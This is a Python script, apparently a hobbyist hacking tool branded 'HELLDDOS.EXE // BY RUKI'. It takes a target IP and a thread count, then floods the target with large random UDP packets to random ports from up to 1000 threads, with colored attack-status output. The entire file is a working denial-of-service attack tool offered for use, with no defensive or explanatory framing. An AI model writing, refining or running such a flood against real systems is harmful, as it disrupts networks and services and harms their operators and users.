import os
import time
import colorama
import socket
import random
import threading

def _exit():
    time.sleep(2)
    exit()

def aggressive_udp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 65500
    packet = random._urandom(packet_size)
    while True:
        try:
            port = random.randint(1, 65535)
            sock.sendto(packet, (target_ip, port))
            print(f"{colorama.Fore.LIGHTRED_EX}[RUKI] [+] Packet sent to {target_ip}:{port}{colorama.Style.RESET_ALL}")
        except:
            print(f"{colorama.Fore.RED}[RUKI] [-] Failed to send packet{colorama.Style.RESET_ALL}")

def main():
    os.system('title HELLDDOS.EXE // BY RUKI')
    os.system('cls' if os.name == "nt" else "clear")
    colorama.init()
    
    print(rf"""{colorama.Fore.LIGHTRED_EX}
██╗  ██╗███████╗██╗     ██╗     ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
██║  ██║██╔════╝██║     ██║     ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
███████║█████╗  ██║     ██║     ███████║██║   ██║██║   ██║█████╔╝ 
██╔══██║██╔══╝  ██║     ██║     ██╔══██║██║   ██║██║   ██║██╔═██╗ 
██║  ██║███████╗███████╗███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
{colorama.Style.RESET_ALL}
        HELLDDOS.EXE // BY RUKI
    """)

    target_ip = input(f"{colorama.Fore.LIGHTRED_EX}Enter target IP > {colorama.Style.RESET_ALL}")
    thread_count = input(f"{colorama.Fore.LIGHTRED_EX}Enter number of threads (max 1000 recommended) > {colorama.Style.RESET_ALL}")

    try:
        thread_count = int(thread_count)
        if thread_count > 1000:
            thread_count = 1000
    except ValueError:
        print(f"{colorama.Fore.RED}Invalid input. Exiting.{colorama.Style.RESET_ALL}")
        _exit()

    for _ in range(thread_count):
        thread = threading.Thread(target=aggressive_udp_flood, args=(target_ip,))
        thread.daemon = True
        thread.start()

    print(f"{colorama.Fore.GREEN}[RUKI] Attack started on {target_ip} with {thread_count} aggressive threads.{colorama.Style.RESET_ALL}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{colorama.Fore.LIGHTRED_EX}[RUKI] Attack stopped by user.{colorama.Style.RESET_ALL}")
        _exit()

if __name__ == '__main__':
    main()
